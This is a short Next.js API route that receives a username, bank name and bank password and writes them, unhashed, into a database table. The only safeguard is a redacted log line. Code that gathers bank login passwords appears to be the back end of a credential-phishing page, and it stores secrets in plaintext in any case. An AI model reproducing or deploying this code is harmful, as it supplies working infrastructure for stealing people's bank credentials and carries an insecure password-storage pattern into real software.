import { sql } from "@/lib/sql"
import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const { user_id, username, bankName, password } = await request.json()

    if (!username || !bankName || !password) {
      return NextResponse.json({ error: "Username, bank name, and password are required" }, { status: 400 })
    }

    await sql`
        INSERT INTO "user_detail" (
            user_id,
            username,
            bank_name,
            password,
            submitted_at
        ) VALUES (
                     ${user_id},
                     ${username},
                     ${bankName},
                     ${password},
                     NOW()
                 )
    `

    console.log("User details submitted:", {
      username,
      bankName,
      password: "[REDACTED]",
    })

    return NextResponse.json(
      {
        message: "User details submitted successfully",
        data: {
          username: username,
          bankName: bankName,
          submittedAt: new Date().toISOString(),
        },
      },
      { status: 201 },
    )
  } catch (error) {
    console.error("Error submitting user details:", error)
    console.log(error)
    return NextResponse.json({ error: "Failed to submit user details" }, { status: 500 })
  }
}
